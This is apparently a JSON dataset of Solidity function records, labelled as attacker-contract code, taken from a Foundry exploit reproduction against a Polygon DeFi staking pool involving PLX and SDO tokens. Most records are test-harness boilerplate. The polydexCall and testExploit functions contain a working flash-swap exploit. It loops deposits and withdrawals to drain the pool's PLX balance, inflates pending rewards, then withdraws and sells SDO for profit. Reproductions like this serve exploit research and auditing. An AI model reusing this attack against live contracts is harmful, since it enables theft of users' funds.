[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "ContractFactory",
    "original_code": "    function ContractFactory() public {\n        address _add;\n        bytes memory bytecode = type(depositToken).creationCode;\n        assembly {\n            _add := create2(0, add(bytecode, 32), mload(bytecode), 1)\n        }\n        addressContract = _add;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "buyPLX",
    "original_code": "    function buyPLX(\n        uint256 amount\n    ) public {\n        address[] memory path = new address[](2);\n        path[0] = address(WMATIC);\n        path[1] = address(PLX);\n        Router.swapTokensForExactTokens(amount, WMATIC.balanceOf(address(this)), path, address(this), block.timestamp);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "polydexCall",
    "original_code": "    function polydexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        if (msg.sender == address(Pair1)) {\n            amounts1 = PLX.balanceOf(address(Pair2)) - 1e18;\n            Pair2.swap(0, amounts1, address(this), new bytes(1));\n            // flashswap callback pair1\n            uint256 amountPLX0 = PLX.balanceOf(address(this));\n            uint256 amountBuy = (amounts0 - amountPLX0) * 1011 / 1000 * 1000 / 995;\n            buyPLX(amountBuy);\n            PLX.transfer(address(Pair1), PLX.balanceOf(address(this)));\n            // exploiter repay WETH to pair, but i dont konw how get weth on ploygon, weth-wmatic lack of liquidity ,i choose to repay plx\n            // uint PLXInPari1 = PLX.balanceOf(address(Pair1));\n            // uint WETHInPair1 =  WETH.balanceOf(address(Pair1));\n            // uint amountWETH =\n            //     (reserve0Pair1 * reserve1Pair1 / ((PLXInPari1 * 1000 - (amountPLX0 * 2 * 995 / 1000)) / 1000) - WETHInPair1) * 1000 / 998;\n            // buyWETH(amountWETH);\n            // PLX.transfer(address(Pair1), amountWETH);\n        }\n\n        if (msg.sender == address(Pair2)) {\n            //reduced lptoken\n            while (PLX.balanceOf(address(Pool)) > 100) {\n                uint256 amount = PLX.balanceOf(address(this));\n                if (PLX.balanceOf(address(this)) * 5 / 1000 > PLX.balanceOf(address(Pool))) {\n                    amount = PLX.balanceOf(address(Pool)) * 1000 / 5;\n                }\n                Pool.deposit(uint256(9), amount);\n                Pool.withdraw(uint256(9), amount);\n            }\n\n            // flashswap callback pair2\n            PLX.transfer(address(Pair2), amounts1 * 1000 / 995 + 1e18);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"polygon\", 16_225_172);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public payable {\n        PLX.approve(address(Pool), type(uint256).max);\n        WMATIC.approve(address(Router), type(uint256).max);\n        (reserve0Pair1, reserve1Pair1,) = Pair1.getReserves();\n        (reserve0Pair2, reserve1Pair2,) = Pair2.getReserves();\n        address(WMATIC).call{value: 10_000 ether}(\"\");\n        // depost PLX\n        ContractFactory();\n        (bool success,) = addressContract.call{value: 1 ether}(abi.encodeWithSignature(\"depositPLX()\"));\n        //revert();\n        require(success);\n        // change block.timestamp\n        cheats.warp(block.timestamp + 5 * 60 * 60);\n        amounts0 = PLX.balanceOf(address(Pair1)) - 1 * 1e18;\n        Pair1.swap(amounts0, 0, address(this), new bytes(1));\n        // change block.timestamp\n        cheats.warp(block.timestamp + 5 * 60 * 60 + 1);\n        uint256 amountreward = Pool.pendingReward(uint256(9), addressContract);\n        (bool success1,) = addressContract.call(abi.encodeWithSignature(\"withdrawPLX()\"));\n        require(success1);\n\n        emit log_named_decimal_uint(\"Attacker SDO profit after exploit\", SDO.balanceOf(addressContract), 18);\n\n        (bool success2,) = addressContract.call(abi.encodeWithSignature(\"sellSDO()\"));\n        require(success2);\n        WMATIC.balanceOf(address(this));\n\n        emit log_named_decimal_uint(\"Attacker USDC profit after exploit\", USDC.balanceOf(addressContract), 6);\n    }\n\n",
    "description": ""
  }
]